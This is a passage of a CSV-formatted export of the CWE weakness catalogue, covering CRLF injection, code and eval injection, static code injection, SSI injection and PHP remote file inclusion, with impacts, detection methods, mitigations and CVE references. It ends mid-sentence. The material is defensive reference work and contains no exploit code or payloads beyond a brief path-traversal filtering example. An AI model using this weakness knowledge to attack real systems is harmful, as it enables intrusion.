ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:23:ENTRY NAME:XML Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::250::83::,\"::TYPE:Maintenance:NOTE:The description for this entry is generally applicable to XML, but the name includes blind XPath injection which is more closely associated with CWE-643. Therefore this entry might need to be deprecated or converted to a general category - although injection into raw XML is not covered by CWE-643 or CWE-652.::TYPE:Theoretical:NOTE:In vulnerability theory terms, this is a representation-specific case of a Data/Directive Boundary Error.::TYPE:Research Gap:NOTE:Under-reported. This is likely found regularly by third party code auditors, but there are very few publicly reported examples.::\",\n93,\"Improper Neutralization of CRLF Sequences ('CRLF Injection')\",Base,Draft,\"The product uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.\",\"\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:117:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Avoid using CRLF as a special sequence.::PHASE:Implementation:DESCRIPTION:Appropriately filter or quote CRLF sequences in user-controlled input.::\",\"::REFERENCE:CVE-2002-1771:DESCRIPTION:CRLF injection enables spam proxy (add mail headers) using email address or name.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1771::REFERENCE:CVE-2002-1783:DESCRIPTION:CRLF injection in API function arguments modify headers for outgoing requests.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1783::REFERENCE:CVE-2004-1513:DESCRIPTION:Spoofed entries in web server log file via carriage returns:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1513::REFERENCE:CVE-2006-4624:DESCRIPTION:Chain: inject fake log entries with fake timestamps using CRLF injection:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4624::REFERENCE:CVE-2005-1951:DESCRIPTION:Chain: Application accepts CRLF in an object ID, allowing HTTP response splitting.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1951::REFERENCE:CVE-2004-1687:DESCRIPTION:Chain: HTTP response splitting via CRLF in parameter related to URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1687::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:CRLF Injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:24:ENTRY NAME:HTTP Request Splitting::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::15::81::,\"\",\n94,\"Improper Control of Generation of Code ('Code Injection')\",Base,Draft,\"The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.\",\"When a product allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the product. Such an alteration could lead to arbitrary code execution. Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:913:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Interpreted:LANGUAGE PREVALENCE:Sometimes::TECHNOLOGY NAME:AI/ML:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:In some cases, injectable code controls authentication; this may lead to a remote vulnerability.::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Injected code can access resources that the attacker is directly prevented from accessing.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:Often the actions performed by injected control code are unlogged.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Refactor your program so that you do not have to dynamically generate code.::PHASE:Architecture and Design:DESCRIPTION:Run your code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your product. Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. To reduce the likelihood of code injection, use stringent allowlists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().::PHASE:Testing:DESCRIPTION:Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.::PHASE:Testing:DESCRIPTION:Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.::PHASE:Operation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Implementation:DESCRIPTION:For Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].:EFFECTIVENESS:Discouraged Common Practice::\",\"::REFERENCE:CVE-2023-29374:DESCRIPTION:Math component in an LLM framework translates user input into a Python expression that is input into the Python exec() method, allowing code execution - one variant of a prompt injection attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2023-29374::REFERENCE:CVE-2024-5565:DESCRIPTION:Python-based library uses an LLM prompt containing user input to dynamically generate code that is then fed as input into the Python exec() method, allowing code execution - one variant of a prompt injection attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-5565::REFERENCE:CVE-2024-4181:DESCRIPTION:Framework for LLM applications allows eval injection via a crafted response from a hosting provider.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-4181::REFERENCE:CVE-2022-2054:DESCRIPTION:Python compiler uses eval() to execute malicious strings as Python code.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-2054::REFERENCE:CVE-2021-22204:DESCRIPTION:Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22204::REFERENCE:CVE-2020-8218:DESCRIPTION:Code injection in VPN product, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8218::REFERENCE:CVE-2008-5071:DESCRIPTION:Eval injection in PHP program.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5071::REFERENCE:CVE-2002-1750:DESCRIPTION:Eval injection in Perl program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1750::REFERENCE:CVE-2008-5305:DESCRIPTION:Eval injection in Perl program using an ID that should only contain hyphens and numbers.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5305::REFERENCE:CVE-2002-1752:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1752::REFERENCE:CVE-2002-1753:DESCRIPTION:Eval injection in Perl program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1753::REFERENCE:CVE-2005-1527:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1527::REFERENCE:CVE-2005-2837:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2837::REFERENCE:CVE-2005-1921:DESCRIPTION:MFV. code injection into PHP eval statement using nested constructs that should not be nested.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1921::REFERENCE:CVE-2005-2498:DESCRIPTION:MFV. code injection into PHP eval statement using nested constructs that should not be nested.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2498::REFERENCE:CVE-2005-3302:DESCRIPTION:Code injection into Python eval statement from a field in a formatted file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3302::REFERENCE:CVE-2007-1253:DESCRIPTION:Eval injection in Python program.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1253::REFERENCE:CVE-2001-1471:DESCRIPTION:chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1471::REFERENCE:CVE-2002-0495:DESCRIPTION:Perl code directly injected into CGI library file from parameters to another CGI program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0495::REFERENCE:CVE-2005-1876:DESCRIPTION:Direct PHP code injection into supporting template file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1876::REFERENCE:CVE-2005-1894:DESCRIPTION:Direct code injection into PHP script that can be accessed by attacker.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1894::REFERENCE:CVE-2003-0395:DESCRIPTION:PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0395::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY ID:CODE:ENTRY NAME:Code Evaluation and Injection::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 3.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 3.5::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::\",::242::35::77::,\"\",\n95,\"Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\",Variant,Incomplete,\"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. eval).\",\"This may allow an attacker to execute arbitrary code, or at least modify what code can be executed.\",::NATURE:ChildOf:CWE ID:94:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:JavaScript:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Python:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Perl:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Ruby:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Interpreted:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:AI/ML:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Implementation:NOTE:This weakness is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Files or Directories:IMPACT:Read Application Data:NOTE:The injected code could access restricted data / files.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:In some cases, injectable code controls authentication; this may lead to a remote vulnerability.::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Injected code can access resources that the attacker is directly prevented from accessing.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:NOTE:Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:Often the actions performed by injected control code are unlogged.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:If possible, refactor your code so that it does not need to use eval() at all.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control. Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.::PHASE:Implementation:DESCRIPTION:For Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].:EFFECTIVENESS:Discouraged Common Practice::\",\"::REFERENCE:CVE-2024-4181:DESCRIPTION:Framework for LLM applications allows eval injection via a crafted response from a hosting provider.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-4181::REFERENCE:CVE-2022-2054:DESCRIPTION:Python compiler uses eval() to execute malicious strings as Python code.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-2054::REFERENCE:CVE-2021-22204:DESCRIPTION:Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22204::REFERENCE:CVE-2021-22205:DESCRIPTION:Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22205::REFERENCE:CVE-2008-5071:DESCRIPTION:Eval injection in PHP program.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5071::REFERENCE:CVE-2002-1750:DESCRIPTION:Eval injection in Perl program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1750::REFERENCE:CVE-2008-5305:DESCRIPTION:Eval injection in Perl program using an ID that should only contain hyphens and numbers.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5305::REFERENCE:CVE-2002-1752:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1752::REFERENCE:CVE-2002-1753:DESCRIPTION:Eval injection in Perl program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1753::REFERENCE:CVE-2005-1527:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1527::REFERENCE:CVE-2005-2837:DESCRIPTION:Direct code injection into Perl eval function.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2837::REFERENCE:CVE-2005-1921:DESCRIPTION:MFV. code injection into PHP eval statement using nested constructs that should not be nested.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1921::REFERENCE:CVE-2005-2498:DESCRIPTION:MFV. code injection into PHP eval statement using nested constructs that should not be nested.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2498::REFERENCE:CVE-2005-3302:DESCRIPTION:Code injection into Python eval statement from a field in a formatted file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3302::REFERENCE:CVE-2007-1253:DESCRIPTION:Eval injection in Python program.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1253::REFERENCE:CVE-2001-1471:DESCRIPTION:chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1471::REFERENCE:CVE-2007-2713:DESCRIPTION:Chain: Execution after redirect triggers eval injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2713::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Direct Dynamic Code Evaluation ('Eval Injection')::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A3:ENTRY NAME:Malicious File Execution:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:IDS35-PL:ENTRY NAME:Do not invoke the eval form with a string argument:MAPPING FIT:Exact::\",::35::,\"::TYPE:Other:NOTE:Factors: special character errors can play a role in increasing the variety of code that can be injected, although some vulnerabilities do not require special characters at all, e.g. when a single function without arguments can be referenced and a terminator character is not necessary.::\",\n96,\"Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\",Base,Draft,\"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.\",\"\",::NATURE:ChildOf:CWE ID:94:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Perl:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Interpreted:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Implementation:NOTE:This issue is frequently found in PHP applications that allow users to set configuration variables that are stored within executable PHP files. Technically, this could also be performed in some compiled code (e.g., by byte-patching an executable), although it is highly unlikely.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Files or Directories:IMPACT:Read Application Data:NOTE:The injected code could access restricted data / files.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:In some cases, injectable code controls authentication; this may lead to a remote vulnerability.::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Injected code can access resources that the attacker is directly prevented from accessing.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:NOTE:Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:Often the actions performed by injected control code are unlogged.::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Perform proper output validation and escaping to neutralize all code syntax from data written to code files.::\",\"::REFERENCE:CVE-2002-0495:DESCRIPTION:Perl code directly injected into CGI library file from parameters to another CGI program.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0495::REFERENCE:CVE-2005-1876:DESCRIPTION:Direct PHP code injection into supporting template file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1876::REFERENCE:CVE-2005-1894:DESCRIPTION:Direct code injection into PHP script that can be accessed by attacker.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1894::REFERENCE:CVE-2003-0395:DESCRIPTION:PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0395::REFERENCE:CVE-2007-6652:DESCRIPTION:chain: execution after redirect allows non-administrator to perform static code injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6652::\",,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Direct Static Code Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted Input to Command::\",::35::73::77::81::85::,\"::TYPE:Relationship:NOTE:HTML injection (see CWE-79: XSS) could be thought of as an example of this, but the code is injected and executed on the client side, not the server side. Server-Side Includes (SSI) are an example of direct static code injection.::\",\n97,\"Improper Neutralization of Server-Side Includes (SSI) Within a Web Page\",Variant,Draft,\"The product generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.\",\"\",::NATURE:ChildOf:CWE ID:96:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Server-Side Includes (SSI) Injection::TAXONOMY NAME:WASC:ENTRY ID:36:ENTRY NAME:SSI Injection::\",::101::35::,\"::TYPE:Relationship:NOTE:This can be resultant from XSS/HTML injection because the same special characters can be involved. However, this is server-side code execution, not client-side.::\",\n98,\"Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')\",Variant,Draft,\"The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in require, include, or similar functions.\",\"In certain versions and configurations of PHP, this can allow an attacker to specify a URL to a remote location from which the product will obtain the code to execute. In other cases in association with path traversal, the attacker can specify a local file that may contain executable statements that can be parsed by PHP.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000::NATURE:ChildOf:CWE ID:829:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:94:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:426:VIEW ID:1000::,\"\",::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Often::,\"\",\"::TERM:Remote file include::TERM:RFI:DESCRIPTION:The Remote File Inclusion (RFI) acronym is often used by vulnerability researchers.::TERM:Local file inclusion:DESCRIPTION:This term is frequently used in cases in which remote download is disabled, or when the first part of the filename is not under the attacker's control, which forces use of relative path traversal (CWE-23) attack techniques to access files that may contain previously-injected PHP code, such as web access logs.::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:The attacker may be able to specify arbitrary code to be executed from a remote location. Alternatively, it may be possible to use normal program behavior to insert php code into files on the local machine which can then be included and force the code to execute since php ignores everything in the file except for the content between php specifiers.::\",\"::METHOD:Manual Analysis:DESCRIPTION:Manual white-box analysis can be very effective for finding this issue, since there is typically a relatively small number of include or require statements in each program.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:The external control or influence of filenames can often be detected using automated static analysis that models data flow within the product. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines.::\",\"::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent lists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the 